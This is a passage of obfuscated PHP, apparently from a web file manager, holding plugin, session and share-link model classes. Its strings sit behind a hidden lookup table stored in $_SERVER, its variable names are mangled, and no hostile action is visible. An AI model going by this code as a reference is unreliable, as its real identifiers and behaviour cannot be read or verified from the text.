µ[$÷®§š½Î[2150]])) { return $ÈàÉß‡»; } foreach ($Úõ¬ú µ[$÷®§š½Î[2150]] as $Ø§Éêó => $˜ÓÅ²è) { if (!isset($˜ÓÅ²è[$÷®§š½Î[452]]) || isset($ÈàÉß‡»[$Ø§Éêó])) { continue; } $ÈàÉß‡»[$Ø§Éêó] = $˜ÓÅ²è[$÷®§š½Î[452]]; } return $ÈàÉß‡»; } public function getPackageJson($Ä‚ÊåÎ“) { return Hook::apply($Ä‚ÊåÎ“ . $_SERVER[åÄ¼Ùßš][2151]); } public function getConfig($üî¯›ÁÍ, $™Ó€«ÀÅ = false) { $Ã¥™¡¢ğ =& $_SERVER[åÄ¼Ùßš]; $€âĞéÒÓ = array(); $ÆòÙù£Ù = $this->loadList($üî¯›ÁÍ); if ($ÆòÙù£Ù && is_array($ÆòÙù£Ù[$Ã¥™¡¢ğ[6]])) { $€âĞéÒÓ = $ÆòÙù£Ù[$Ã¥™¡¢ğ[6]]; } if (!$€âĞéÒÓ || $™Ó€«ÀÅ) { $€âĞéÒÓ = $this->getConfigDefault($üî¯›ÁÍ); } return $€âĞéÒÓ; } public function setConfig($äÊİÓ, $Éëİ¾ï• = false) { $À¯ùâû¢ =& $_SERVER[åÄ¼Ùßš]; $ª¶ĞËï = $this->loadList($äÊİÓ); if (!$ª¶ĞËï) { return !1; } $úãİ¤²Ç = $ª¶ĞËï[$À¯ùâû¢[6]]; if ($Éëİ¾ï• == !1) { $úãİ¤²Ç = array(); $Éëİ¾ï• = $this->getConfigDefault($äÊİÓ); } foreach ($Éëİ¾ï• as $âò‚ÇâÉ => $ÛÂ°Öéì) { $úãİ¤²Ç[$âò‚ÇâÉ] = is_string($ÛÂ°Öéì) ? trim($ÛÂ°Öéì) : $ÛÂ°Öéì; } $this->update($ª¶ĞËï[$À¯ùâû¢[484]], array($À¯ùâû¢[6] => $úãİ¤²Ç)); } public function viewList() { $æÙÇËÃ¨ =& $_SERVER[åÄ¼Ùßš]; $‹îéÅªŸ = $this->loadList(); $this->pluginScan($‹îéÅªŸ); $‹îéÅªŸ = $this->loadPluginList(); $øÈíü” = array(); foreach ($‹îéÅªŸ as $ùç“¢áÊ => $àÙŒğŒó) { $¼ûƒÂ¤â = $àÙŒğŒó; unset($àÙŒğŒó[$æÙÇËÃ¨[2141]], $àÙŒğŒó[$æÙÇËÃ¨[6]]); $ÌÕáà”Å = PLUGIN_DIR . $àÙŒğŒó[$æÙÇËÃ¨[32]] . $æÙÇËÃ¨[2143]; if (!is_file($ÌÕáà”Å)) { continue; } $ó•ĞŞ¯¥ = Hook::apply($àÙŒğŒó[$æÙÇËÃ¨[32]] . $æÙÇËÃ¨[2151]); if (!is_array($ó•ĞŞ¯¥)) { continue; } $øÈíü”[$ùç“¢áÊ] = array_merge($àÙŒğŒó, $ó•ĞŞ¯¥); if ($¼ûƒÂ¤â[$æÙÇËÃ¨[6]][$æÙÇËÃ¨[1729]] != $ó•ĞŞ¯¥[$æÙÇËÃ¨[1703]]) { Hook::apply($àÙŒğŒó[$æÙÇËÃ¨[32]] . $æÙÇËÃ¨[2148]); $¼ûƒÂ¤â[$æÙÇËÃ¨[6]][$æÙÇËÃ¨[1729]] = $ó•ĞŞ¯¥[$æÙÇËÃ¨[1703]]; $this->update($àÙŒğŒó[$æÙÇËÃ¨[484]], array($æÙÇËÃ¨[6] => $¼ûƒÂ¤â[$æÙÇËÃ¨[6]])); } } return $øÈíü”; } private function loadPluginList() { $¦„ñ‘èß =& $_SERVER[åÄ¼Ùßš]; $øÎÂ…Ë = $this->loadList(); if (strtolower(MOD) == $¦„ñ‘èß[2152]) { return $øÎÂ…Ë; } $ê‰‡…Ìˆ = Hook::trigger($¦„ñ‘èß[2153], $øÎÂ…Ë); if ($øÎÂ…Ë && !$ê‰‡…Ìˆ) { die; } return $ê‰‡…Ìˆ ? $ê‰‡…Ìˆ : $øÎÂ…Ë; } private function pluginScan($×¼ó¾æº) { $ÄÔ¨‚ÂÎ =& $_SERVER[åÄ¼Ùßš]; recursion_dir(PLUGIN_DIR, $¶ÄÜ¤æ, $Ïç›€¬õ, 0); foreach ($¶ÄÜ¤æ as $ÊıÂ÷¸Ù) { $“ÈÈı¹× = get_path_this($ÊıÂ÷¸Ù); if (isset($×¼ó¾æº[$“ÈÈı¹×]) || !file_exists($ÊıÂ÷¸Ù . $ÄÔ¨‚ÂÎ[2154]) || !file_exists($ÊıÂ÷¸Ù . $ÄÔ¨‚ÂÎ[2143])) { continue; } Hook::apply($“ÈÈı¹× . $ÄÔ¨‚ÂÎ[2148]); } } } goto a¢¹¸„›‰ä; a¢¹¸„›‰ä: class SessionModel extends ModelBase { protected $tableName = "\163\x79\x73\164\145\x6d\x5f\x73\x65\x73\x73\x69\x6f\156"; public function get($Å’‚”ÄŒ) { $¿Ìíï‹» =& $_SERVER[åÄ¼Ùßš]; $Ü’¹ëËÓ = $this->where(array($¿Ìíï‹»[2155] => $Å’‚”ÄŒ))->find(); if (!is_array($Ü’¹ëËÓ)) { return !1; } return $Ü’¹ëËÓ[$¿Ìíï‹»[171]]; } public function set($Ñº…İÇæ, $ªå—Ç±§, $±•´¼Ø× = 3600) { $°ƒÄî¨¥ =& $_SERVER[åÄ¼Ùßš]; $Ë•–‰ïÈ = array($°ƒÄî¨¥[2155] => $Ñº…İÇæ, $°ƒÄî¨¥[2056] => $ªå—Ç±§, $°ƒÄî¨¥[2156] => $±•´¼Ø× + time()); if (Session::get($°ƒÄî¨¥[2157])) { $Ë•–‰ïÈ[$°ƒÄî¨¥[1817]] = Session::get($°ƒÄî¨¥[2157]); } else { $Ë•–‰ïÈ[$°ƒÄî¨¥[1817]] = 0; } if ($this->get($Ñº…İÇæ)) { return $this->where(array($°ƒÄî¨¥[2155] => $Ñº…İÇæ))->save($Ë•–‰ïÈ); } else { return $this->add($Ë•–‰ïÈ, array(), !0); } } public function remove($™ûÍÖØ·) { return $this->where(array($_SERVER[åÄ¼Ùßš][2155] => $™ûÍÖØ·))->delete(); } public function clearTimeout() { return $this->where($_SERVER[åÄ¼Ùßš][2158] . time())->delete(); } } class ShareModel extends ModelBase { protected $tableName = "\163\x68\x61\162\x65"; protected $dataAuto = array(array("\x6d\157\x64\151\x66\x79\x54\151\x6d\x65", "\164\151\155\x65", "\151\156\163\145\162\164\54\x75\x70\x64\141\164\x65", "\x66\165\x6e\x63\164\151\157\x6e"), array("\x63\x72\x65\x61\164\145\x54\x69\155\x65", "\x74\x69\x6d\145", "\x69\156\163\x65\x72\x74", "\x66\165\x6e\143\x74\x69\157\x6e"), array("\x6f\x70\164\151\157\x6e\163", '', "\151\x6e\x73\145\162\164\54\165\160\x64\x61\164\145\54\163\145\154\x65\143\164", "\x6a\x73\157\x6e")); private $fieldList = "\52"; protected function cacheFunctionAlias($“Û©Šıõ) { $´Ôáª×ƒ =& $_SERVER[åÄ¼Ùßš]; $º‡¥®ÎÂ = isset($“Û©Šıõ[0]) ? $“Û©Šıõ[0] : !1; $§å„Õ¡Ì = $´Ôáª×ƒ[2159] . USER_ID; return array($´Ôáª×ƒ[2160] => array(USER_ID, $´Ôáª×ƒ[2161]), $´Ôáª×ƒ[2100] => array($º‡¥®ÎÂ, $´Ôáª×ƒ[2162], $§å„Õ¡Ì)); } protected function listSimple() { $ éÖÁÆ = array($_SERVER[åÄ¼Ùßš][1817] => USER_ID); $Â´” Ú” = $this->field($this->fieldList)->where($ éÖÁÆ)->select(); return $Â´” Ú” ? $Â´” Ú” : array(); } protected function getInfo($ÀŸŞ‹ø, $±½¢Œ”  = false, $ëŸ±ÏÉ¨ = '') { $Úæãå =& $_SERVER[åÄ¼Ùßš]; if (!$ëŸ±ÏÉ¨) { $ëŸ±ÏÉ¨ = $Úæãå[2159] . USER_ID; } if ($±½¢Œ” ) { return $this->_getShareInfo(array($Úæãå[681] => $ÀŸŞ‹ø)); } $½Ö‹ú˜š = $this->cacheFunctionGet($Úæãå[2102], $ÀŸŞ‹ø, $ëŸ±ÏÉ¨); $°‰•šƒ¸ = $this->shareInfoMofify($½Ö‹ú˜š, $Úæãå[226]); if (isset($½Ö‹ú˜š[$Úæãå[88]]) && $°‰•šƒ¸ != $½Ö‹ú˜š[$Úæãå[88]]) { $†î÷Ûæ = $this->cacheKeyMake($Úæãå[2102], $ÀŸŞ‹ø, $ëŸ±ÏÉ¨); $½Ö‹ú˜š = $this->_getShareInfo(array($Úæãå[681] => $ÀŸŞ‹ø)); Cache::set($†î÷Ûæ, $½Ö‹ú˜š); } return $½Ö‹ú˜š; } private function shareInfoMofify(&$²™Õ¿ª, $¿ÎŞ×½ = "\147\x65\164") { $Ûúèõ¨É =& $_SERVER[åÄ¼Ùßš]; if (!$²™Õ¿ª || !isset($²™Õ¿ª[$Ûúèõ¨É[681]])) { return; } $È¬êÇµ = $Ûúèõ¨É[2163] . $²™Õ¿ª[$Ûúèõ¨É[681]]; if ($¿ÎŞ×½ == $Ûúèõ¨É[226]) { return Cache::get($È¬êÇµ); } else { if ($¿ÎŞ×½ == $Ûúèõ¨É[2131]) { $±ˆ¢ÂÜä = Cache::get($È¬êÇµ); if ($±ˆ¢ÂÜä === $²™Õ¿ª[$Ûúèõ¨É[88]]) { return; } $²™Õ¿ª[$Ûúèõ¨É[2164]] = USER_ID . $Ûúèõ¨É[474] . $²™Õ¿ª[$Ûúèõ¨É[88]]; Cache::set($È¬êÇµ, $²™Õ¿ª[$Ûúèõ¨É[88]]); } else { if ($¿ÎŞ×½ == $Ûúèõ¨É[2165]) { Cache::remove($È¬êÇµ); } } } } public function getInfoByHash($ë©œõàª) { return $this->_getShareInfo(array($_SERVER[åÄ¼Ùßš][2166] => $ë©œõàª)); } public function getInfoByPath($Úéê¤ÚÍ) { $Öœí×Î¤ =& $_SERVER[åÄ¼Ùßš]; $ö¡ï—ßí = array($Öœí×Î¤[1817] => USER_ID, $Öœí×Î¤[194] => $Úéê¤ÚÍ); return $this->_getShareInfo($ö¡ï—ßí); } public function getInfoBySourcePath($ìÂÆğñ›) { $âÇª¼Ã =& $_SERVER[åÄ¼Ùßš]; $¹†«š†˜ = array($âÇª¼Ã[1817] => USER_ID, $âÇª¼Ã[1295] => $ìÂÆğñ›); return $this->_getShareInfo($¹†«š†˜); } private function _getShareInfo($ûÆµº—°) { $£µ§İÊÓ =& $_SERVER[åÄ¼Ùßš]; $¡˜ÅÜï’ = $this->where($ûÆµº—°)->find(); if (!$¡˜ÅÜï’) { return !1; } $ûÆµº—° = array($£µ§İÊÓ[681] => $¡˜ÅÜï’[$£µ§İÊÓ[681]]); $æáù´Ïú = $£µ§İÊÓ[2167]; $ÒõóòØ = Model($£µ§İÊÓ[682])->order($£µ§İÊÓ[484])->field($æáù´Ïú)->where($ûÆµº—°)->select(); if ($¡˜ÅÜï’[$£µ§İÊÓ[194]] == $£µ§İÊÓ[231]) { $¡˜ÅÜï’[$£µ§İÊÓ[90]] = IO::info($¡˜ÅÜï’[$£µ§İÊÓ[1295]]); } else { $¡˜ÅÜï’[$£µ§İÊÓ[90]] = Model($£µ§İÊÓ[1466])->pathInfo($¡˜ÅÜï’[$£µ§İÊÓ[194]]); } $¡˜ÅÜï’[$£µ§İÊÓ[2168]] = $ÒõóòØ; $this->shareInfoMofify($¡˜ÅÜï’, $£µ§İÊÓ[2131]); return $¡˜ÅÜï’; } protected function getInfoAuth($©ùÛ‹õÙ) { $î–ºËÂ =& $_SERVER[åÄ¼Ùßš]; $ªÓ†üÆÑ = $this->getInfo($©ùÛ‹õÙ); if ($ªÓ†üÆÑ[$î–ºËÂ[1817]] == USER_ID) { $ªÓ†üÆÑ[$î–ºËÂ[499]] = $ªÓ†üÆÑ[$î–ºËÂ[90]][$î–ºËÂ[499]]; } else { $ªÓ†üÆÑ[$î–ºËÂ[499]] = Model($î–ºËÂ[580])->authMake($ªÓ†üÆÑ[$î–ºËÂ[2168]]); } return $ªÓ†üÆÑ; } protected function listData($¯œïÁ¸à = null, $ª¶ùğ®¥ = 300) { $íş¢†øÙ =& $_SERVER[åÄ¼Ùßš]; $÷ßŒĞ³´ = array(array($íş¢†øÙ[575] => array($íş¢†øÙ[1120], 0), $íş¢†øÙ[679] => array($íş¢†øÙ[1120], 0), $íş¢†øÙ[2169] => $íş¢†øÙ[2119])); if ($¯œïÁ¸à == $íş¢†øÙ[2170]) { $÷ßŒĞ³´ = array($íş¢†øÙ[575] => 1); } else { if ($¯œïÁ¸à == $íş¢†øÙ[1278]) { $÷ßŒĞ³´ = array($íş¢†øÙ[679] => 1); } } $÷ßŒĞ³´[$íş¢†øÙ[1817]] = USER_ID; $ÌÄªîÂ = $this->where($÷ßŒĞ³´)->selectPage($ª¶ùğ®¥); return $ÌÄªîÂ; } protected function listToMe($ËÚ´ºÊà = 300) { $ˆì¿àÅ =& $_SERVER[åÄ¼Ùßš]; $öŠ»ş½ = Model($ˆì¿àÅ[2171])->userGroupParents(USER_ID); $Û·¯‘Ş = array($ˆì¿àÅ[664] => SourceModel::TYPE_USER, $ˆì¿àÅ[582] => USER_ID); if ($öŠ»ş½) { $Û·¯‘Ş = array(array($ˆì¿àÅ[664] => SourceModel::TYPE_USER, $ˆì¿àÅ[582] => USER_ID), array($ˆì¿àÅ[664] => SourceModel::TYPE_GROUP, $ˆì¿àÅ[582] => array($ˆì¿àÅ[7], $öŠ»ş½)), $ˆì¿àÅ[2169] => $ˆì¿àÅ[2119]); } $Û®üÁ‚Å = Model($ˆì¿àÅ[682])->where($Û·¯‘Ş)->selectPage($ËÚ´ºÊà); $©ÕÖò“Û = array_to_keyvalue_group($Û®üÁ‚Å[$ˆì¿àÅ[447]], $ˆì¿àÅ[681]); if (!$©ÕÖò“Û) { return $Û®üÁ‚Å; } $ãÇÉµê¶ = $ˆì¿àÅ[2172]; $Û·¯‘Ş = array($ˆì¿àÅ[681] => array($ˆì¿àÅ[504], array_keys($©ÕÖò“Û)), $ˆì¿àÅ[1817] => array($ˆì¿àÅ[1122], $ˆì¿àÅ[231])); $½¯Š§÷­ = $this->field($ãÇÉµê¶)->where($Û·¯‘Ş)->select(); foreach ($½¯Š§÷­ as $ç‚ÄØ©ã => &$…µò¯µÉ) { $…µò¯µÉ[$ˆì¿àÅ[2168]] = $©ÕÖò“Û[$…µò¯µÉ[$ˆì¿àÅ[681]]]; } unset($…µò¯µÉ); $¢ÇÍè·¼ = array($ˆì¿àÅ[2173] => $½¯Š§÷­, $ˆì¿àÅ[2174] => $Û®üÁ‚Å[$ˆì¿àÅ[444]]); return $¢ÇÍè·¼; } protected function shareAdd($ûËÀîö‹, $ÄšîËğç) { $°ÆÚ‘ş» =& $_SERVER[åÄ¼Ùßš]; $ÓĞÎ…ıÖ = $this->_addShareData($ûËÀîö‹, $ÄšîËğç); if (!empty($ÄšîËğç[$°ÆÚ‘ş»[2175]])) { $this->_shareAuthSet($ÓĞÎ…ıÖ, $ÄšîËğç[$°ÆÚ‘ş»[2175]]); } $this->shareEventAdd($ûËÀîö‹, $ÄšîËğç, $°ÆÚ‘ş»[2176]); return $ÓĞÎ…ıÖ; } protected function shareAddSystem($à‰Ü‰¸‰, $±•­âÕ) { $Õú¨¯™ =& $_SERVER[åÄ¼Ùßš]; $ÒÉÎÄ³ˆ = $this->_addShareData($à‰Ü‰¸‰, $±•­âÕ, $Õú¨¯™[192]); $this->_shareAuthSet($ÒÉÎÄ³ˆ, $±•­âÕ[$Õú¨¯™[2175]]); return $ÒÉÎÄ³ˆ; } private function shareEventAdd($¶ÄƒéÁÀ, $˜Û‰¡¼ı, $¿Œƒ¸ğ× = "\141\x64\x64") { $Ğ¢¾äøÄ =& $_SERVER[åÄ¼Ùßš]; if (!$¶ÄƒéÁÀ || $¶ÄƒéÁÀ == $Ğ¢¾äøÄ[231]) { return; } if ($¿Œƒ¸ğ× == $Ğ¢¾äøÄ[2176]) { if ($˜Û‰¡¼ı[$Ğ¢¾äøÄ[575]] == $Ğ¢¾äøÄ[91]) { Model($Ğ¢¾äøÄ[649])->eventShare($¶ÄƒéÁÀ, $Ğ¢¾äøÄ[2177]); } if ($˜Û‰¡¼ı[$Ğ¢¾äøÄ[679]] == $Ğ¢¾äøÄ[91]) { Model($Ğ¢¾äøÄ[649])->eventShare($¶ÄƒéÁÀ, $Ğ¢¾äøÄ[2178]); } return; } $ìƒ±Æâ = $this->getInfoByPath($¶ÄƒéÁÀ); $ªµ‹É›¤ = $Ğ¢¾äøÄ[2179]; if ($ìƒ±Æâ[$Ğ¢¾äøÄ[575]] == $Ğ¢¾äøÄ[231] && $˜Û‰¡¼ı[$Ğ¢¾äøÄ[575]] == $Ğ¢¾äøÄ[91]) { $ªµ‹É›¤ = $Ğ¢¾äøÄ[2177]; } if ($ìƒ±Æâ[$Ğ¢¾äøÄ[575]] == $Ğ¢¾äøÄ[91] && $˜Û‰¡¼ı[$Ğ¢¾äøÄ[575]] == $Ğ¢¾äøÄ[231]) { $ªµ‹É›¤ = $Ğ¢¾äøÄ[2180]; } if ($ìƒ±Æâ[$Ğ¢¾äøÄ[679]] == $Ğ¢¾äøÄ[231] && $˜Û‰¡¼ı[$Ğ¢¾äøÄ[679]] == $Ğ¢¾äøÄ[91]) { $ªµ‹É›¤ = $Ğ¢¾äøÄ[2178]; } if ($ìƒ±Æâ[$Ğ¢¾äøÄ[679]] == $Ğ¢¾äøÄ[91] && $˜Û‰¡¼ı[$Ğ¢¾äøÄ[679]] == $Ğ¢¾äøÄ[231]) { $ªµ‹É›¤ = $Ğ¢¾äøÄ[2181]; } Model($Ğ¢¾äøÄ[649])->eventShare($¶ÄƒéÁÀ, $ªµ‹É›¤); return; } private function _addShareData($ú¦¼ÎÁ, $ï¡õ§èÅ = array(), $¥§ êä¨ = false) { $ªâ¤ßå‘ =& $_SERVER[åÄ¼Ùßš]; $÷‹§õÊó = $¥§ êä¨ == $ªâ¤ßå‘[192] ? 0 : USER_ID; $ğ¹îØŒî = array($ªâ¤ßå‘[503] => $ú¦¼ÎÁ, $ªâ¤ßå‘[1808] => $÷‹§õÊó); if ($ú¦¼ÎÁ == 0) { $ğ¹îØŒî = array($ªâ¤ßå‘[2182] => $ï¡õ§èÅ[$ªâ¤ßå‘[1295]], $ªâ¤ßå‘[1808] => $÷‹§õÊó); } if ($ˆš¦¯Şô = $this->where($ğ¹îØŒî)->find()) { return $ˆš¦¯Şô[$ªâ¤ßå‘[681]]; } if ($ú¦¼ÎÁ == 0) { $½šá°×‹ = array($ªâ¤ßå‘[32] => get_path_this($ï¡õ§èÅ[$ªâ¤ßå‘[87]])); } else { $½šá°×‹ = Model($ªâ¤ßå‘[926])->sourceInfo($ú¦¼ÎÁ); if (!$½šá°×‹) { return !1; } } if (!$ï¡õ§èÅ[$ªâ¤ßå‘[1704]]) { $ï¡õ§èÅ[$ªâ¤ßå‘[1704]] = $½šá°×‹[$ªâ¤ßå‘[32]]; } $ß¥¾« = array($ªâ¤ßå‘[1808] => $÷‹§õÊó, $ªâ¤ßå‘[503] => $ú¦¼ÎÁ, $ªâ¤ßå‘[1704] => $ªâ¤ßå‘[12], $ªâ¤ßå‘[575] => 0, $ªâ¤ßå‘[679] => 0, $ªâ¤ßå‘[1295] => $ªâ¤ßå‘[12], $ªâ¤ßå‘[384] => $ªâ¤ßå‘[12], $ªâ¤ßå‘[994] => $ªâ¤ßå‘[12], $ªâ¤ßå‘[2183] => 0, $ªâ¤ßå‘[2184] => 0, $ªâ¤ßå‘[855] => 0, $ªâ¤ßå‘[2185] => $ªâ¤ßå‘[12], $ªâ¤ßå‘[2166] => $ªâ¤ßå‘[12]); $¿œŠŞ‘² = explode($ªâ¤ßå‘[50], $ªâ¤ßå‘[2186]); foreach ($¿œŠŞ‘² as $áÚãÚ®¶) { if (!isset($ï¡õ§èÅ[$áÚãÚ®¶])) { continue; } $ß¥¾«[$áÚãÚ®¶] = $ï¡õ§èÅ[$áÚãÚ®¶]; } $ÙçĞó©“ = $this->add($ß¥¾«); $…€„îĞ¤ = array($ªâ¤ßå‘[2166] => short_id($ÙçĞó©“)); if ($this->where($…€„îĞ¤)->find()) { $…€„îĞ¤[$ªâ¤ßå‘[2166]] .= $ªâ¤ßå‘[474] . rand_string(2, 3); } $this->where(array($ªâ¤ßå‘[2187] => $ÙçĞó©“))->save($…€„îĞ¤); return $ÙçĞó©“; } private function _shareAuthSet($ù¸ˆ˜”¥, $¥ô˜£ôµ) { $ƒœ‚Öêí =& $_SERVER[åÄ¼Ùßš]; if (!is_array($¥ô˜£ôµ)) { return !1; } $ı¨É±±Â = Model($ƒœ‚Öêí[2129]); $ı¨É±±Â->where(array($ƒœ‚Öêí[681] => $ù¸ˆ˜”¥))->delete(); $ñ’şªõÛ = array(); foreach ($¥ô˜£ôµ as $øù©¤•ú) { $…—§âáÃ = SourceModel::TYPE_USER; if ($øù©¤•ú[$ƒœ‚Öêí[191]] == SourceModel::TYPE_GROUP) { $…—§âáÃ = SourceModel::TYPE_GROUP; } $›¸ì†ß = array($ƒœ‚Öêí[681] => $ù¸ˆ˜”¥, $ƒœ‚Öêí[191] => $…—§âáÃ, $ƒœ‚Öêí[582] => intval($øù©¤•ú[$ƒœ‚Öêí[582]]), $ƒœ‚Öêí[2125] => 0, $ƒœ‚Öêí[2188] => -1); if ($øù©¤•ú[$ƒœ‚Öêí[2125]]) { $›¸ì†ß[$ƒœ‚Öêí[2125]] = $øù©¤•ú[$ƒœ‚Öêí[2125]]; } else { if ($øù©¤•ú[$ƒœ‚Öêí[2188]]) { $›¸ì†ß[$ƒœ‚Öêí[2188]] = $øù©¤•ú[$ƒœ‚Öêí[2188]]; } } $ñ’şªõÛ[] = $›¸ì†ß; } return $ı¨É±±Â->addAll($ñ’şªõÛ, array(), !0); } public function numViewAdd($šäŞÛ‹±) { $Âˆ¥£óº =& $_SERVER[åÄ¼Ùßš]; $Ø¸İî = array($Âˆ¥£óº[2187] => $šäŞÛ‹±); $this->where($Ø¸İî)->setAdd($Âˆ¥£óº[2183]); } public function numDownloadAdd($ÃÆÙíñş) { $­íù«ôä =& $_SERVER[åÄ¼Ùßš]; $Š±¥›³÷ = array($­íù«ôä[2187] => $ÃÆÙíñş); $this->where($Š±¥›³÷)->setAdd($­íù«ôä[2184]); } protected function shareEdit($ÛŞÄ…Ÿê, $µÜ¸…Ÿ¶) { $ßÙ‡ÄÉ› =& $_SERVER[åÄ¼Ùßš]; $ÇºîÎÎÍ = $this->getInfo($ÛŞÄ…Ÿê); if (!$ÇºîÎÎÍ) { return !1; } if ($µÜ¸…Ÿ¶[$ßÙ‡ÄÉ›[2166]] && $µÜ¸…Ÿ¶[$ßÙ‡ÄÉ›[575]] == $ßÙ‡ÄÉ›[91]) { if ($µÜ¸…Ÿ¶[$ßÙ‡ÄÉ›[2166]] == $ÇºîÎÎÍ[$ßÙ‡ÄÉ›[2166]]) { unset($µÜ¸…Ÿ¶[$ßÙ‡ÄÉ›[2166]]); } if ($µÜ¸…Ÿ¶[$ßÙ‡ÄÉ›[2166]]) { $ìüê¥´à = $this->where(array($ßÙ‡ÄÉ›[2189] => $µÜ¸…Ÿ¶[$ßÙ‡ÄÉ›[2166]]))->find(); if ($ìüê¥´à) { return !1; } if (!is_array($µÜ¸…Ÿ¶[$ßÙ‡ÄÉ›[2185]])) { $µÜ¸…Ÿ¶[$ßÙ‡ÄÉ›[2185]] = is_array($ÇºîÎÎÍ[$ßÙ‡ÄÉ›[2185]]) ? $ÇºîÎÎÍ[$ßÙ‡ÄÉ›[2185]] : array(); } if (!$µÜ¸…Ÿ¶[$ßÙ‡ÄÉ›[2185]][$ßÙ‡ÄÉ›[2190]]) { $µÜ¸…Ÿ¶[$ßÙ‡ÄÉ›[2185]][$ßÙ‡ÄÉ›[2190]] = $ÇºîÎÎÍ[$ßÙ‡ÄÉ›[2166]]; $µÜ¸…Ÿ¶[$ßÙ‡ÄÉ›[2185]][$ßÙ‡ÄÉ›[2191]] = $ßÙ‡ÄÉ›[91]; } } } $this->_checkLinkShare($µÜ¸…Ÿ¶, $ÇºîÎÎÍ); $ÑÕ¯Õü = array(); $áÅ¹¡û = explode($ßÙ‡ÄÉ›[50], $ßÙ‡ÄÉ›[2192]); foreach ($áÅ¹¡û as $ÉŠã„) { if (!array_key_exists($ÉŠã„, $µÜ¸…Ÿ¶)) { continue; } $ÑÕ¯Õü[$ÉŠã„] = $µÜ¸…Ÿ¶[$ÉŠã„]; } $this->shareEventAdd($ÇºîÎÎÍ[$ßÙ‡ÄÉ›[194]], $µÜ¸…Ÿ¶, $ßÙ‡ÄÉ›[1987]); $this->where(array($ßÙ‡ÄÉ›[2187] => $ÛŞÄ…Ÿê))->save($ÑÕ¯Õü); if (isset($µÜ¸…Ÿ¶[$ßÙ‡ÄÉ›[2175]])) { $this->_shareAuthSet($ÛŞÄ…Ÿê, $µÜ¸…Ÿ¶[$ßÙ‡ÄÉ›[2175]]); } return !0; } private function _checkLinkShare($…õ¡Ø©¡, $”Ü±”Éñ) { $·ïõŒÃ› =& $_SERVER[åÄ¼Ùßš]; if ($…õ¡Ø©¡[$·ïõŒÃ›[575]] != $·ïõŒÃ›[91]) { return; } $·€ğÇ©ò = $”Ü±”Éñ[$·ïõŒÃ›[90]][$·ïõŒÃ›[194]]; if ($”Ü±”Éñ[$·ïõŒÃ›[90]][$·ïõŒÃ›[33]] != $·ïõŒÃ›[233]) { $œÀÀªêô = $this->_folderReport($·€ğÇ©ò); if (!$œÀÀªêô) { return; } show_json(LNG($·ïõŒÃ›[2193]) . $·ïõŒÃ›[2194] . $œÀÀªêô, !1); } $£“Ã—Ñª = Model($·ïõŒÃ›[926])->fileInfoGet($”Ü±”Éñ[$·ïõŒÃ›[90]][$·ïõŒÃ›[194]]); if (!$£“Ã—Ñª) { return; } $»ÁÁïÂÃ = $this->shareFileMeta($£“Ã—Ñª[$·ïõŒÃ›[554]]); if (isset($»ÁÁïÂÃ[$·ïõŒÃ›[452]]) && $»ÁÁïÂÃ[$·ïõŒÃ›[452]] == $·ïõŒÃ›[91]) { show_json(LNG($·ïõŒÃ›[2195]), !1); } } private function _folderReport($ÅøÎ×¼‡) { $ÀºÂóçÄ =& $_SERVER[åÄ¼Ùßš]; $Ó‘­ÌˆÏ = array($ÀºÂóçÄ[554] => array($ÀºÂóçÄ[1120], 0), $ÀºÂóçÄ[843] => 3); $ÃÛÍ§±„ = Model($ÀºÂóçÄ[2196])->where($Ó‘­ÌˆÏ)->field($ÀºÂóçÄ[554])->select(); if (!$ÃÛÍ§±„) { return !1; } $ÃÛÍ§±„ = array_to_keyvalue($ÃÛÍ§±„, $ÀºÂóçÄ[12], $ÀºÂóçÄ[554]); $úŸŞ¤Î… = $ÀºÂóçÄ[50] . $ÅøÎ×¼‡ . $ÀºÂóçÄ[50]; $Ó‘­ÌˆÏ = array($ÀºÂóçÄ[554] => array($ÀºÂóçÄ[7], $ÃÛÍ§±„), $ÀºÂóçÄ[597] => array($ÀºÂóçÄ[471], "\x25{$úŸŞ¤Î…}\x25"), $ÀºÂóçÄ[517] => 0); $å’ÇÖ¶Î = Model($ÀºÂóçÄ[926])->where($Ó‘­ÌˆÏ)->field($ÀºÂóçÄ[2197])->find(); if (!$å’ÇÖ¶Î) { return !1; } $»•à‹™Ä = substr($å’ÇÖ¶Î[$ÀºÂóçÄ[597]], strpos($å’ÇÖ¶Î[$ÀºÂóçÄ[597]], $úŸŞ¤Î…)); $Ó‘­ÌˆÏ = array($ÀºÂóçÄ[194] => array($ÀºÂóçÄ[7], trim($»•à‹™Ä, $ÀºÂóçÄ[50]))); $æá ”†‘ = Model($ÀºÂóçÄ[926])->where($Ó‘­ÌˆÏ)->field($ÀºÂóçÄ[32])->select(); $ç‡²Û‰ = array_to_keyvalue($æá ”†‘, $ÀºÂóçÄ[12], $ÀºÂóçÄ[32]); $ç‡²Û‰[] = $å’ÇÖ¶Î[$ÀºÂóçÄ[32]]; return implode($ÀºÂóçÄ[8], $ç‡²Û‰); } protected function remove($ıÕÜşù) { $œßóª²ä =& $_SERVER[åÄ¼Ùßš]; $…àÍšûÑ = is_array($ıÕÜşù) ? $ıÕÜşù : array($ıÕÜşù); for ($×ì¨ÄÒê = 0; $×ì¨ÄÒê < count($…àÍšûÑ); $×ì¨ÄÒê++) { $¼‘Ğß‹½ = $this->getInfo($…àÍšûÑ[$×ì¨ÄÒê]); if ($¼‘Ğß‹½[$œßóª²ä[679]] == $œßóª²ä[91]) { Model($œßóª²ä[649])->eventShare($¼‘Ğß‹½[$œßóª²ä[194]], $œßóª²ä[2181]); } if ($¼‘Ğß‹½[$œßóª²ä[575]] == $œßóª²ä[91]) { Model($œßóª²ä[649])->eventShare($¼‘Ğß‹½[$œßóª²ä[194]], $œßóª²ä[2180]); } $this->shareInfoMofify($¼‘Ğß‹½, $œßóª²ä[2165]); } $Ÿí™ÙÈ‘ = array($œßóª²ä[681] => array($œßóª²ä[7], $…àÍšûÑ)); $„šªÖ¤Æ = $this->where($Ÿí™ÙÈ‘)->delete(); if ($„šªÖ¤Æ) { Model($œßóª²ä[682])->where($Ÿí™ÙÈ‘)->delete(); } return $„šªÖ¤Æ; } protected function removeBySource($¬™ˆ´ç²) { $½Ê½íğ» =& $_SERVER[åÄ¼Ùßš]; $ÔŸüğ© = array($½Ê½íğ»[503] => array($½Ê½íğ»[504], $¬™ˆ´ç²)); $§“ñÛ³Š = $this->field($½Ê½íğ»[681])->where($ÔŸüğ©)->select(); $±ô¢¡ = array_to_keyvalue($§“ñÛ³Š, $½Ê½íğ»[12], $½Ê½íğ»[681]); if (!$±ô¢¡) { return; } foreach ($§“ñÛ³Š as $‘„è•ş—) { $this->shareInfoMofify($‘„è•ş—, $½Ê½íğ»[2165]); } $ÔŸüğ© = 